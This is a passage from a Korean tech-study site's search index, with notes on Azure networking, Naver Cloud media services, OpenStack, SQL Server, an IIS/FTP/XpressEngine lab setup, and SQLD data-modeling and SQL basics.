주소 및 포트에 따라 트래픽을 라우팅 할 수 있습니다.        HTTP 헤더 수정\n 각 요청의 인바운드 및 아웃바운드 HTTP 헤더에서 저옵를 추가하거나 제거가 가능합니다.         Azure VPN Gateway   고성능 VPN 게이트웨이를 통한 Azure 가상 네트워크에 액세스합니다.     Azure DNS     Azure DNS는 사용자에게 친숙한 Domain을 통해 해당 IP 주소를 매핑하는 방법입니다.\n  Azufre DNS는 매우 빠른 DNS 응답과 매우 높은 도메인 가용성을 제공합니다.\n     Azure Content Delivery Network   전 세계 고객에게 고대역폭 콘텐츠를 제공합니다.     Azure DDoS Protection    Azure에서 호스트되는 애플리케이션을 DDoS(배포된 서비스 거부) 공격으로부터 보호합니다.     Azure Traffic Manager    Traffic Manager는 사용자에게 가장 가까운 DNS 서버를 사용하여 사용자 트래픽을 전역적으로 분산된 엔드포인트로 보냅니다.\n  전 세계 Azure 지역에 네트워크 트래픽을 분산합니다.\n     Azure ExpressRoute   고대역폭 전용 보안 연결을 통해 Azure에 연결합니다.     Azure Network Watcher   시나리오 기반 분석을 사용하여 네트워크 문제를 모니터링하고 진단합니다.     Azure Firewall   확장성에 제한이 없고 보안 수준이 높은 고가용성 방화벽을 구현합니다.     Azure 가상 WAN   로컬 사이트와 원격 사이트를 연결하는 통합 WAN(광역 네트워크)을 구축합니다.    "}),a.add({id:159,href:'/docs/ncp/ncptraining/nca11/',title:"Naver Cloud Media",content:"Media Service   Live Station   실시간 방송을 위한 플랫폼   트랜스코딩을 통해 여러 화질로 변환 후 송출\n  스트림 상태를 볼 수 있는 모니터링 기능 제공\n  Thumbnail Image 추출\n  타임머신(Time Shift) 기능으로 놓치지 않는 라이브 방송 서비스 구현 가능\n  CDN 연동을 통해 안정적인 송출 가능\n       VOD Transcoder   고품질 저비용의 클라우드 미디어 파일 변환 서비스   VOD Transcoder는 미디어 원본 파일을 모바일, PC 등 다양한 디바이스에서 다양한 화질로 시청할 수 있또록 변환해주는 클라우드 기반의 미디어 서비스\n  시중에서 사용되는 거의 모든 입력 포맷 및 코덱을 지원하여 높은 인코딩 성공율을 보장\n  인터넷 라이브 생중계를 할 수 있는 Live Transcoder, 대용량 트래픽을 처리할 수 있는 CDN과 결합하여 LIVE/ COD 통합 서비스를 구현가능\n       VOD Station   쉽고 빠른 VOD 서비스 구축 상품   Object Storage내의 영상 파일을 CDN을 통해 스트리밍\n  손쉽게 VOD 송출 시스템 구축가능\n  DASH, HLS 및 Segment Duration 지원\n       Image Optimizer   이미지를 다양한 사이즈로 변환하여 CDN을 통해 제공   이미지를 Object Storage에 업로드하면 미리 설정된 룰에 맞추어 변환\n  이미지는 CDN+ 를 통해 제공\n  리사이즈, 크롭시 자동회전, 얼굴인식 기능 제공\n  룰 설정은 Query String으로 설정\n       Workplace    인사, 회계 그룹웨어 SaaS\n  워크 플로우, 인사, 회계시스템에 사내 메신저, 게시판, 조직도 기반 주소록, 메일, 캘린더, 사내 공유 폴더까지 기업에서 필요로 하는 백 오피스 시스템 SaaS로 제공\n  모바일 환경에 최적화된 App 제공\n    "}),a.add({id:160,href:'/docs/openstack/openstacktraining/',title:"OpenStack Training",content:" OpenStack Training  OpenStack Ussuri   OpenStack Ussuri : Overview\n  OpenStack Ussuri : 환경설정\n  OpenStack Ussuri : Keystone\n  OpenStack Ussuri : Glance\n  OpenStack Ussuri : Nova\n  OpenStack Ussuri : Neutron\n  OpenStack Ussuri : Cinder\n  OpenStack Ussuri : Horizon\n  OpenStack Ussuri : Swift\n  OpenStack Ussuri : Heat\n  OpenStack Ussuri : Gnocch\n  OpenStack Ussuri : Trove\n  OpenStack Ussuri : Designate\n  OpenStack Ussuri : Brabican\n  OpenStack Ussuri : Rally\n  OpenStack Ussuri : Manila\n        OpenStack Stain    DevStack    PackStack      OpenStack   OpenStack의 개요\n  Keyston : 인증을 관리하는 서비스\n  Glance : 이미지를 관리하는 서비스\n  Nova : 가상의 서버를 생성하는 서비스\n  Neutron : 네트워크를 관리하는 서비스\n  Cinder : 블록 스토리지 서비스\n  Ceilometer : 리소스의 사용량과 부하를 관리하는 서비스\n  Horizon : 외부 인터페이스 대시보드 서비스\n  Swift : 오브젝트 스토리지 관리 서비스\n  Heat : 오케트스트레션 서비스\n  Trove : 데이터베이스 서비스\n  Sahara : 데이터 프로세싱 서비스\n  Ironic : 베어메탈 서비스\n       "}),a.add({id:161,href:'/docs/system/window/window11/',title:"SQL Server",content:"SQL Server   데이터베이스의 정의   데이터의 저장 공간으로 자료가 저장되는 디스크 공간을 의미합니다.     Windows SQL Sever    Microsoft사에서 제작한 데이터베이스 관리 소프트웨어로 대용량 데이터를 운영하기에 적합한 툴로 인정받고 있습니다.\n  SQL Server 2016 주요 에디션\n     특징 Enterprise Standard Express     라이선스 유료 유료 무료   주용도 대규모 중소규모 소규모 혹은 개인   최대 CPU OS 지원 최대 개수 소켓 4개 또는 코어 16개 소켓 1개 또는 코어 4개   최대 RAM 사용량 OS 지원 최대 크기 128GB 1GB   DB 크기 524PB 524PB 10GB       SQL Server 실습   SQL Server 설치를 위해 FIRST 서버에서 SQL Server를 설치합니다.                                                   "}),a.add({id:162,href:'/docs/database/sqld/sqld-1/',title:"SQLD : 데이터 모델링",content:"데이터 모델링   데이터 모델링의 이해   데이터 모델링이란 현실에 존재하는 것을 데이터베이스에 사용할 수 있도록 모델링하는 과정     데이터 모델링의 중요성 및 유의점   중복 : 같은 시간 같은 데이터 제공\n  비유연성 : 사소한 업무변화에 데이터 모델이 수시로 변경되면 안됨\n  비일관성 : 신용 상태에 대한 갱신 없이 고객의 납부 이력 정보 갱신 안됨\n        데이터 모델링\n 개념적, 논리적, 물리적 데이터 모델링       데이터 독립성 요소 : 스키마     스키마란 데이터베이스의 구조와 제약 조건에 관한 전반적인 명세를 기바술한 메타데이터의 집합\n  스키마는 데이터베이스를 구성하는 개체(Entity), 속성(Attribute), 관계(Relationship) 및 데이터 조작 시 데이터 값들이 갖는 제약 조건 등에 관해 전박적으로 정의\n        사용자의 관점에 따른 스키마의 종류\n  외부 스키마 : 개개인 사용자가 보는 개인적 DB 스키마\n  개념 스키마 : 모든 사용자 관점을 통합한 전체 DB\n  내부 스키마 : 물리적 장치에서 데이터가 실제적 저장\n       데이터 독립성   논리적 독립성 : 개념 스키마가 변경되어도 외부 스키마에 영향 x\n  물리적 독립성 : 내부스키마가 변경되어도 외부/개념 스키마는 영향 x\n  Mapping(사상) : 상호 독립적인 개념을 연결시켜주는 다리\n       데이터 모델링의 3요소   어떤 것(Things)\n  성격(Attributes)\n  관계(Relationships)\n       데이터 모델링은 프로젝트에 참여한 모두가 숙지  엔터티 : 집합 인스턴스 : 단수        데이터 모델 표기법\n 1976년 피터첸이 Entity Relationship Model 개발       모델링의 특징   추상화\n  단순화\n  정확화\n       Entity Relationship Diagram 작업순서   엔터티 그림\n  엔터티 배치\n  엔터티 관계설정\n  관계명 기술\n  관계의 참여도 기술\n  관계필수여부\n       좋은 데이터 모델의 요소   완전성 : 업무에 필요한 모든 데이터가 모델에 정의\n  중복배제 : 하나의 DB내에 동일한 사실은 한번만.\n  업무규칙 : 많은 규칙을 사용자가 공유하도록 제공\n  데이터 재사용 : 데이터가 독립적으로 설계돼야 함\n  의사소통 : 업무규칙은 엔터티,서브타입,속성,관계 등의 형태로 최대한 자세히 표현\n  통합성 : 동일한 데이터는 한 번만 정의, 참조활용\n       엔터티의 특징   엔터티 : 업무에 필요하고 유용한 정보를 저장하고 관리하기 위한 집합적인 것, 보이지 않는 개념 포함\n    반드시 해당 업무에서 필요하고 관리하고자 함\n  유일한 식별자에 의해 식별 가능\n  두 개 이상의 인스턴스의 집합\n  업무 프로세스에 의해 이용되어야 함\n  반드시 속성이 있어야 함\n  다른 엔터티와 최소 1개 이상의 관계가 있어야 함\n        엔터티의 분류\n  유무형에 따른 분류 : 유형, 개념, 사건 엔터티\n  유형:물리적 형태 ex)사원, 물품, 강사\n  개념:개념적 정보 ex)조직, 보험상품\n  사건:업무 수행시 발생 ex)주문, 청구, 미납\n       발생시점에 따른 분류 : 기본/키, 중심, 행위 엔터티   기본:그 업무에 원래 존재하는 정보, 타 엔터티의 부모 역할, 자신의 고유한 주식별자 가짐 ex)사원,부서\n  중심:기본 엔터티로부터 발생, 다른 엔터티와의 관계로 많은 행위 엔터티 생성 ex)계약, 사고, 주문\n  행위:2개 이상의 부모엔터티로부터 발생, 자주 바뀌거나 양이 증가 ex)주문목록, 사원변경이력\n        엔터티의 명명\n 현업업무에서 사용하는 용어 사용, 약어 사용금지, 단수명사 사용, 고유한 이름 사용, 생성의미대로 부여       속성   업무에서 필요로 하는 인스턴스로 관리하고자 하는 의미상 분리되지 않는 최소의 데이터 단위\n  한 개의 엔터티는 2개 이상의 인스턴스 집합\n  한 개의 엔터티는 2개 이상의 속성을 가짐\n  한 개의 속성은 1개의 속성값을 가짐\n       속성의 분류 : 기본, 설계, 파생 속성   기본: 업무로부터 추출한 모든 일반적인 속성\n  설계: 업무를 규칙화하기 위해 새로 만들거나 변형, 정의하는 속성 ex)일련번호\n  파생: 다른 속성에 영향을 받아 발생하는 속성, 빠른 성능을 낼 수 있도록 원래 속성의 값을 계산 ex)합\n       도메인  각 속성이 가질 수 있는 값의 범위 ex)5글자       속성의 명명   해당업무에서 사용하는 이름 부여\n  서술식 속성명은 사용 금지\n  약어 사용 금지\n  전체 데이터모델에서 유일성 확보\n        관계\n 엔터티의 인스턴스 사이의 논리적인 연관성으로서 존재의 형태로서나 행위로서 서로에게 연관성이 부여된 상태       패어링  엔터티 안에 인스턴스가 개별적으로 관계를 가지는 것       UML에는 연관관계와 의존관계가 있는데, 연관(존재적)관계는 항상 이용하는 관계이고 의존관계는 상대방 행위에 의해 발생하는 관계를 의미     ERD에서는 존재적 관계와 행위에 의한 관계를 구분하지 않고 표기했지만 UML에서는 이를 구분하여 연관관계는 실선, 의존관계는 점선으로 표현      관계의 표기법   관계명 : 관계의 이름\n  관계차수 : 1:1, 1:M, M:N\n  관계선택성(관계선택사양) : 필수관계, 선택관계\n       관계 체크사항   2개의 엔터티 사이에 관심있는 연관 규칙o?\n  2개의 엔터티 사이에 정보의 조합 발생o?\n  업무기술서,장표에 관계연결에 대한 규칙 서술o?\n  업무기술서,장표에 관계연결을 가능케 하는 동사o?\n       식별자   엔터티내에서 인스턴스를 구분하는 구분자\n  식별자는 논리 데이터 모델링 단계에 사용\n  Key는 물리 데이터 모델링 단계에 사용\n       식별자의 특징   유일성, 최소성, 불변성, 존재성\n  주식별자에 의해 모든 인스턴스들이 유일하게 구분\n  주식별자를 구성하는 속성의 수는 유일성을 만족하는 최소의 수가 되어야 함\n  지정된 주식별자의 값은 자주 변하지 않아야 함\n  주식별자가 지정이 되면 반드시 값이 들어와야 함\n       식별자 분류   대표성여부 : 주식별자, 보조식별자\n 주 : 엔터티 내에서 각 어커런스를 구분할 수 있는 구분자, 타 엔터티와 참조관계를 연결할 수 있음 보조 : 어커런스를 구분할 수 있는 구분자이나 대표성을 가지지 못해 참조관계 연결 불가    스스로생성여부 : 내부식별자, 외부식별자\n 내부 : 스스로 생성되는 식별자 외부 : 타 엔터티로부터 받아오는 식별자    속성의 수 : 단일식별자, 복합식별자\n 단일 : 하나의 속성으로 구성 복합 : 2개 이상의 속성으로 구성    대체 여부 : 본질식별자, 인조식별자\n 본질 : 업무에 의해 만들어지는 식별자 인조 : 인위적으로 만든 식별자         주식별자 도출기준  해당 업무에서 자주 이용되는 속성임 명칭, 내역 등과 같이 이름으로 기술되는 것들은 x 복합으로 주식별자로 구성할 경우 너무 많은 속성x       식별자 관계  주식별자 : 자식의 주식별자로 부모의 주식별자 상속 부모로부터 받은 식별자를 자식엔터티의 주식별자로 이용하는 경우 강한 연결관계 표현, 실선 표기       비식별자   부모 속성을 자식의 일반 속성으로 사용\n  부모 없는 자식이 생성될 수 있는 경우\n  부모와 자식의 생명주기가 다른 경우\n  여러개의 엔터티가 하나의 엔터티로 통합되어 표현되었는데 각각의 엔터티가 별도의 관계를 가진 경우\n  자식엔터티에 별도의 주식별자를 생성하는 것이 더 유리한 경우\n  SQL 문장이 길어져 복잡성 증가되는 것 방지 약한 연결관계 표현, 점선 표기\n       데이터 모델과 성능   성능 데이터 모델링   DB 성능향상을 목적으로 설계단계의 데이터 모델링 때부터 정규화, 반정규화, 테이블통합, 테이블분할, 조인구조, PK, FK 등 여러 가지 성능과 관련된 사항이 데이터 모델링에 반영될 수 있도록 하는 것\n  분석/설계 단계에서 데이터 모델에 성능을 고려한 데이터 모델링을 수행할 경우 성능저하에 따른 재업무 비용을 최소화 할 수 있는 기회를 가지게 된다.\n  데이터의 증가가 빠를수록 성능저하에 따른 성능개선비용은 기하급수적으로 증가하게 된다.\n       성능 데이터 모델링 고려사항 순서   데이터 모델링을 할 때 정규화를 정확하게 수행\n  DB 용량산정을 수행한다.\n  DB에 발생되는 트랜잭션의 유형을 파악한다.\n  용량과 트랜잭션의 유형에 따라 반정규화를 수행\n  이력모델의 조정, PK/FK조정, 슈퍼/서브타입 조정\n  성능관점에서 데이터 모델을 검증한다.\n       기본적으로 데이터는 속성간의 함수종속성에 근거하여 정규화되어야 한다. 정규화는 선택이 아니라 필수사항   함수적 종속성 : 데이터들이 어떤 기준 값에 의해 종속되는 현상\n  정규화 : 반복적인 데이터를 분리하고 각 데이터가 종속된 테이블에 적절하게 배치되도록 하는 것\n  칼럼에 의한 반복, 중복적인 속성 값을 갖는 형태는 1차 정규화의 대상\n  반정규화 : 정규화된 엔터티, 속성, 관계에 대해 시스템의 성능향상과 개발과 운영의 단순화를 위해 중복, 통합, 분리 등을 수행하는 데이터 모델링의 기법\n  일반적으로 정규화시 입력/수정/삭제 성능이 향상되며 반정규화시 조인 성능이 향상된다.\n       반정규화 절차   반정규화 대상조사(범위처리빈도수, 범위, 통계성)\n  다른 방법유도 검토(뷰, 클러스터링, 인덱스 조정)\n  반정규화 적용(테이블, 속성, 관계 반정규화)\n       반정규화 대상조사   자주 사용되는 테이블에 접근하는 프로세스의 수가 많고 항상 일정한 범위만을 조회하는 경우\n  테이블에 대량의 데이터가 있고 대량의 데이터 범위를 자주 처리하는 경우에 처리범위를 일정하게 줄이지 않으면 성능을 보장할 수 없는 경우\n  통계성 프로세스에 의해 통계 정보를 필요로 할 때 별도의 통계테이블을 생성한다.\n  테이블에 지나치게 많은 조인이 걸려 데이터를 조회하는 작업이 기술적으로 어려울 경우\n       다른 방법유도 검토   지나치게 많은 조인이 걸려 데이터를 조회하는 작업이 기술적으로 어려울 경우 VIEW를 사용한다.\n  대량의 데이터처리나 부분처리에 의해 성능이 저하되는 경우 클러스터링을 적용하거나 인덱스를 조정함\n  대량의 데이터는 PK의 성격에 따라 부분적인 테이블로 분리할 수 있다. (파티셔닝 기법)\n  응용 애플리케이션에서 로직을 구사하는 방법을 변경함으로써 성능을 향상시킬 수 있다.\n       반정규화의 기법(테이블, 칼럼, 관계)    테이블 반정규화\n 테이블 병합(1:1관계, 1:M관계, 슈퍼/서브타입)   1:1관계를 통합하여 성능향상\n  1:M관계를 통합하여 성능향상\n  슈퍼/서브 관계를 통합하여 성능향상\n       테이블분할(수직분할, 수평분할)   칼럼단위 테이블을 디스크 I/O를 분산처리하기 위해 테이블을 1:1로 분리하여 성능향상\n  로우단위로 집중 발생되는 트랜잭션을 분석하여 디스크 I/O 및 데이터 접근의 효율성을 높여 성능을 향상하기 위해 로우단위로 테이블을 쪼갬\n       테이블추가(중복, 통계, 이력, 부분테이블 추가)   다른 업무이거나 서버가 다른 경우 동일한 테이블구조를 중복하여 원격조인을 제거하여 성능 향상\n  SUM, AVG 등을 미리 수행하여 계산해 둠으로써 조회 시 성능을 향상\n  이력테이블 중에서 마스터 테이블에 존재하는 레코드를 중복하여 이력테이블에 존재시켜 성능 향상\n  하나의 테이블의 전체 칼럼 중 자주 이용하는 집중화된 칼럼들이 있을 때 디스크 I/O를 줄이기 위해 해당 칼럼들을 모아놓은 별도의 반정규화된 테이블을 생성\n         칼럼 반정규화   중복칼럼 추가 : 조인에 의해 처리할 때 성능저하를 예방하기 위해 중복된 칼럼을 위치시킴\n  파생칼럼 추가 : 트랜잭션이 처리되는 시점에 계산에 의해 발생되는 성능저하를 예방하기 위해 미리 값을 계산하여 칼럼에 보관\n  이력테이블 칼럼추가 : 대량의 이력데이터를 처리할 때 불특정 날 조회나 최근 값을 조회할 때 나타날 수 있는 성능저하를 예방하기 위해 이력테이블에 기능성 칼럼(최근값 여부, 시작과 종료일자 등)을 추가함\n  응용시스템 오작동을 위한 칼럼 추가 : 업무적으로는 의미가 없지만 사용자의 실수로 원래 값으로 복구하기 원하는 경우 이전 데이터를 임시적으로 중복하여 보관하는 기법\n       PK에 의해 테이블을 분할하는 방법(파티셔닝)   RANGE PARTITION : 대상 테이블이 날짜 또는 숫자값으로 분리가 가능하고 각 영역별로 트랜잭션이 분리되는 경우\n  LIST PARTITION : 지점, 사업소 등 핵심적인 코드값으로 PK가 구성되어 있고 대량의 데이터가 있는 테이블의 경우\n  HASH PARTITION : 지정된 HASH 조건에 따라 해시 알고리즘이 적용되어 테이블이 분리\n       테이블에 대한 수평/수직분할의 절차   데이터 모델링을 완성한다.\n  DB 용량산정을 한다.\n  대량 데이터가 처리되는 테이블에 대해 트랜잭션 처리 패턴을 분석한다.\n  칼럼 단위로 집중화된 처리가 발생하는지, 로우 단위로 집중화된 처리가 발생하는지 분석하여 집중화된 단위로 테이블을 분리하는 것을 검토한다.\n      슈퍼/서브 타입 모델    슈퍼/ 서브 타입 모델을 사용하는 이유\n 업무를 구성하는 데이터의 특징의 상관관계와 차이점을 고려하여 효과적 표현하기 위함       슈퍼/서브 타입 데이터 모델의 변환기술   개별로 발생되는 트랜잭션에 대해서는 개별 테이블로 구성(One To One Type)\n  슈퍼타입+서브타입에 대해 발생되는 트랜잭션에 대해서는 슈퍼+서브타입 테이블로 구성(Plus Type)\n  전체를 하나로 묶어 트랜잭션이 발생할 때는 하나의 테이블로 구성(Single Type, All in One Type)\n       인덱스 특성을 고려한 PK/FK DB 성능향상   인덱스의 특징은 여러 개의 속성이 하나의 인덱스로 구성되어 있을 때 앞쪽에 위치한 속성의 값이 비교자로 있어야 좋은 효율을 나타낸다.\n  앞쪽에 위치한 속성의 값이 가급적 ‘=’ 아니면 최소한 범위 ‘BETWEEN’ ‘\u0026lt;\u0026gt;’ 가 들어와야 효율적이다.\n       분산 DB   여러 곳으로 분산되어있는 DB를 하나의 가상 시스템으로 사용할 수 있도록 한 DB\n  논리적으로 동일한 시스템에 속하지만, 컴퓨터 네트워크를 통해 물리적으로 분산되어 있는 데이터집합\n       분산 DB를 만족하기 위한 6가지 투명성   분할 투명성(단편화) : 하나의 논리적 Relation이 여러 단편으로 분할되어 각 사본이 여러 site에 저장\n  위치 투명성 : 사용하려는 데이터의 저장 장소 명시 불필요, 위치정보가 시스템 카탈로그에 유지\n  지역사상 투명성 : 지역 DBMS와 물리적 DB 사이의 Mapping 보장\n  중복 투명성 : DB 객체가 여러 stie에 중복 되어 있는지 알 필요가 없는 성질\n  장애 투명성 : 구성요소의 장애에 무관한 트랜잭션의 원자성 유지\n  병행 투명성 : 다수 트랜잭션 동시 수행시 결과의 일관성 유지, TimeStamp, 분산 2단계 Locking 이용\n       분산 DB 장-단점   장점   지역 자치성\n  신뢰성 가용성\n  효용성 융통성\n  빠른 응답속도\n  각 지역 사용자 요구 수용\n       단점   비용증가\n  오류의 잠재성 증대\n  설계 관리의 복잡성\n  불규칙한 응답 속도\n  통제의 어려움\n  데이터 무결성 위협\n         분산 DB 적용 기법   테이블 위치 분산 : 설계된 테이블을 본사와 지사단위로 분산\n  테이블 분할 분산 : 각각의 테이블을 쪼개어 분산\n  수평분할 : 로우 단위로 분리\n  수직분할 : 칼럼 단위로 분리\n       테이블 복제 분산   동일한 테이블을 다른 지역이나 서버에서 동시에 생성하여 관리하는 유형\n  테이블 복제 분산의 종류\n  부분복제 : 마스터 DB에서 테이블의 일부의 내용만 다른 지역이나 서버에 위치\n  광역복제 : 마스터 DB 테이블의 내용을 각 지역이나 서버에 존재\n         테이블 요약 분산   지역 간에 또는 서버 간에 데이터가 비슷하지만 서로 다른 유형으로 존재하는 경우\n  테이블 요약 분산의 종류\n  분석요약 : 동일한 테이블 구조를 가지고 있으면서 분산되어 있는 동일한 내용의 데이터를 이용하여 통합된 데이터를 산출하는 방식\n  통합요약 : 분산되어 있는 다른 내용의 데이터를 이용하여 통합된 데이터를 산출하는 방식\n         분산 DB 설계를 고려해야 하는 경우   성능이 중요한 사이트\n  공통코드, 기준정보, 마스터 데이터의 성능향상\n  실시간 동기화가 요구되지 않는 경우, 거의 실시간의 업무적인 특징을 가지고 있는 경우(?)\n  특정 서버에 부하가 집중되어 부하를 분산\n  백업 사이트 구성하는 경우\n      "}),a.add({id:163,href:'/docs/openstack/openstack/trove/',title:"Trove",content:"데이터베이스 서비스 : Trove   Trove는 관계형 데이터베이스 기능을 활용 클라우드 사용자와 데이터 베이스 관리자는 필요에 따라 Trove를 통해 데이터베이스 인스턴스를 제공, 관리 서비스   Trove의 논리 아키텍처      구성요소 역할     python-troveclient 클라이언트에서 콘솔로 trove-api를 실행할 수 있게 지원   trove-api RESTful API 방식의 JSON을 지원, Trove인스턴스를 관리하고 프로비저닝   trove-taskmanager 인스턴스 프로비저닝을 지원, 라이프 사이클 관리 및 운영하는 작업을 수행   trove-conductor 호스트에서 실행되는 서비스로 호스트 정보를 업데이트 및 게스트 인스턴스 메시지를 수신   trove-guestagent 게스트 인스턴스 안에서 실행, 데이터 베이스 작업을 실행, 관리    "}),a.add({id:164,href:'/docs/azure/microsoftazure/azure02/',title:"Azure Mobile",content:"Azure Mobile    Azure Mobile은 개발자가 iOS, Android 및 Windows 앱용 모바일 백 엔드 서비스를 쉽고 빠르게 만들 수 있게 해줍니다. Azure Mobile의 기능은 다음과 같습니다.   오프라인 데이터 동기화\n  온-프레미스 데이터 연결\n  푸시 알림 브로드캐스트\n  비즈니스 요구 사항과 일치하도록 자동 크기조정\n      "}),a.add({id:165,href:'/docs/system/window/window12/',title:"IIS",content:"Windows Web Server IIS, FTP Server   IIS(Internet Information Services)   WIndows Server 2016에 내장되어 있는 웹 서버 및 FTP 서버는 IIS라는 이름으로제공됩니다.     IIS 실습   IIS 설치를 위해 FIRST Server에서 서버매니저 \u0026gt; 관리 \u0026gt; 역할 및 기능 추가를 선택합니다.       서버역할에서 Web Server IIS를 선택 후 킷을 포함하여 설치를 진행합니다.        역할 서비스 에서 Application Development \u0026gt; CGI 및 FTP Server를 설치하기 위해 체크 후, 설치합니다.        설치가 완료되면 방화벽에 허용되었는 지와 서비스가 실행중인지를 확인합니다.\n  IIS는 World Wide Web, FTP는 Microsoft FTP Service입니다.\n           설치가 완료되면 IIS를 설정을 위해 서버 매니저 \u0026gt; 도구 \u0026gt; IIS 관리자를 선택합니다.       현재 FTP 서버가 등록되어 있지 않으므로 사이트 \u0026gt; FTP 사이트 추가를 선택합니다.       경로를 지정한 후 저장합니다.       SSL은 사용하지 않을 것이므로 설정하지 않습니다.       모두가 접속할 수 있도록 익명, 모든 사용자, 읽기를 설정합니다.       WINCLIENT에서 192.168.10.11로 접속하면 IIS를 확인하실 수 있습니다.        위와 동일하게 FTP 서버 접속을 위해 WINCLIENT에서 ftp 192.168.10.11로 접속합니다.\n  접속 후에는 anonymous(익명사용자) 및 패스워드는 그냥 엔터를 입력하여 접속합니다.\n  접속이 확인할 수 있습니다.\n         기본적으로 웹 사이트는 IIS 괸라자 \u0026gt; 사이트 Default Web Site \u0026gt; 기본 문에서 확인 및 설정이 가능합니다.\n  이제 본격적인 IIS 활용을 진행해보도록 하겠습니다.\n      IIS를 활용한 웹 사이트 구축    IIS를 활용하면 웹 사이트를 구축할 수 있습니다.\n  웹 사이트 구축을 위해 필요한 기본적인 3요소\n  웹 서버 소프트웨어 : IIS, Apache 등\n  웹 프로그래밍 언어 : ASP.NET, ASP, JSP, PHP 등\n  데이터베이스 툴 : SQL Sefver, Oracle, MySQL 등\n       WPI(Web Platform Installer) : Microsoft에서 제공하는 웹 플랫폼\n Internet Information Services(IIS), SQL Server Express, Net Framework, 오픈 소스인 PHP와 mySQL과 같은 소프트웨어 제공       XpressEngine를 통한 웹 페이지 실습    먼저 FIRST Server에서 XpressEngine를 설치합니다.\n  설치 후, 창을 종류 후, IIS 관리자 \u0026gt; 사이트 \u0026gt; Default Web Site \u0026gt; 웹 플랫폼 관리자를 선택합니다.\n        웹 서버를 실행하면 PHP를 검색하여 PHP 5.4.9를 설치합니다.\n  PHP를 선택 후, 설치할 항목에서 IIS용 PHP 관리자를 제거합니다. (호환성 문제)\n        설정이 왼료되면 MySQl를 검색 후, MySQl 5.5버전을 추가 후 설치합니다.       암호를 입력하고 설치를 진행합니다.       설치가 완료되었습니다.       설치가 완료되면 cmd를 시행하여 mysql -u root -p 실행하여 암호를 입력합니다.  mysql\u0026gt; create database xeDB; # DB라는 데이터베이스 만듭니다.  mysql\u0026gt; grant all privileges on *.* to xebUser@\u0026#39;127.0.0.1\u0026#39; identified by \u0026#39;1234\u0026#39;; # WebUser라는 계정을 1234의 PW를 가지고 생성하고 자신의 모든 DB를 사용할 수 있는 권한을 부여합니다.  mysql\u0026gt; exit # MySQL 쿼리를 종료합니다.       DB 설정이 완료되면 Xe를 다운받습니다.\n  IIS의 기본 폴더인 C:\\inetpub\\wwwroot\\에 붙여넣습니다.\n        이어서 게시판은 모든 사용자가 사용해야 하기 때문에 권한에 대한 설정을 진행합니다.\n  IUSR을 생성 후, 모든 권한을 부여합니다.\n       WINCLIENT에서 192.168.10.11/xe로 접속하여 설정을 진행합니다.       MySQL을 지정합니다.       서버에서 설정했던 값들을 기입합니다.       어드민 계정을 생성합니다.       이제 다시 192.168.10.11/xe로 접속하면 다음과 같은 페이지를 확인하실 수 있습니다.       게시판 생성을 위해 하단의 그림과 같이해 사이트 메뉴 편집 \u0026gt; 메뉴 추가 \u0026gt; 게시판을 추가합니다.         로그아웃 후, 게스트의 궈한으로 Board에 접속하여 글을 작성합니다.       게시판을 확인하실 수 있습니다.      웹 하드 구축   웹 하드는 인터넷 상에서 디스크 공간을 사용하는 기능을 제공하는 사이트를 의미합니다.     웹 사이트를 통한 웹 하드 구축    FIRST 서버에 Pydio를 설치합니다.\n  Xe와 동일하게 사용권한을 수정 후, 폴더명을 접근을 쉽게 WebHard로 바꾸어줍니다.\n       C:\\Window\\Temp폴더 또한 권한을 설정해줍니다.        설정이 완료되면 WINCLINT에서 192.168.10.11/WebHard에 접속합니다.\n  접속이 완료되면 에러와 오류를 무시하고 설치를 진행합니다.\n         데이터베이스는 새로 생성해도 되지만 기존의 XeDB와 유저르 사용해보겠습니다.       설정이 완료되면 설치를 진행합니다.       설치가 완료되면 `192.168.10.11/WebHard로 접소하면 접속이 완료됩니다.       새로운 계정생성을 위해 우측의 메뉴에서 설정을 선택합니다.        People \u0026gt; 새 사용자를 선택하여 사용자를 생성합니다.\n  생성된 사용자를 선택하면 사용자를 설정할 수 있습니다.\n         재접속 후, 새로 생성된 유저로 접속하여 업로드 및 생성을 할 수 있습니다.\n  이와 같이 개인적으로 혹은 공유하는 폴더를 웹을 통해 관리할 수도 있습니다.\n      "}),a.add({id:166,href:'/docs/database/sqld/sqld-2/',title:"SQLD : SQL 기본",content:"SQL 기본  SQL 기본    DataBase\n 특정 기업이나 조직 또는 개인이 필요에 의해 데이터를 일정한 형태로 저장해 놓은 것을 의미한다.        DBMS\n 효율적인 데이터 관리 뿐만 아니라 예기치 못한 사건으로 인한 데이터의 손상을 피하고, 필요시 필요한 데이터를 복구하기 위한 강력한 기능의 SW(SoftWare)       DB 발전   1960 : 플로우차트 중심의 개발, 파일구조 사용\n  1970 : DB 관리기법이 처음 태동, 계층-망형 DB등장\n  1980 : 관계형 DB 상용화, Oracle, Sybase 등장\n  1990 : 객체 관계형 DB로 발전\n        SQL\n 관계형 DB에서 데이터 정의, 조작, 제어를 위해 사용하는 언어       SQL 문장들의 종류   DML : SELECT, INSERT, UPDATE, DELETE 등 데이터 조작어\n  DDL : CREATE, ALTER, DROP, RENAME 등 데이터 정의어\n  DCL : GRANT, REVOKE 등 데이터 제어어\n  TCL : COMMIT, ROLLBACK 등 트랜잭션 제어어\n        테이블\n 데이터를 저장하는 객체, 로우(가로, 행)와 칼럼(세로, 열)으로 구성        정규화\n 데이터의 정합성 확보와 데이터 입력/수정/삭제시 발생할 수 있는 이상현상 방지하기 위함        기본키\n 테이블에 존재하는 각 행을 한 가지 의미로 특정할 수 있는 한 개 이상의 칼럼        외부키\n 다른 테이블의 기본키로 사용되고 있는 관계를 연결하는 칼럼       데이터 유형    CHAR(s)\n 고정 길이 문자열 정보 : ‘AA’ = ‘AA ’        VARCHAR(s)\n 가변 길이 문자열 정보 : ‘AA’ != ‘AA ’        NUMERIC\n 정수, 실수 등 숫자 정보 : DATE : 날짜와 시각 정보      CREATE TABLE 테이블이름 ( ... ... );   테이블 명은 다른 테이블의 이름과 중복되면 안 된다.\n  테이블 내의 칼럼명은 중복될 수 없다.\n  각 칼럼들은 , 로 구분되고 ; 로 끝난다.\n  칼럼 뒤에 데이터 유형은 꼭 지정되어야 한다.\n  테이블명과 칼럼명은 반드시 문자로 시작해야한다.\n  A-Z,a-z,0-9,_,$,#만 사용 가능\n  DATETIME 데이터 유형에는 별도로 크기를 지정x\n     제약조건   PRIMARY KEY(기본키) : 기본키 정의\n  UNIQUE KEY(고유키) : 고유키 정의\n  NOT NULL : NULL 값 입력금지\n  CHECK : 입력 값 범위 제한\n  FOREIGN KEY(외래키) : 외래키 정의\n      DESC(RIBE) 테이블명; --\u0026gt; 테이블 구조 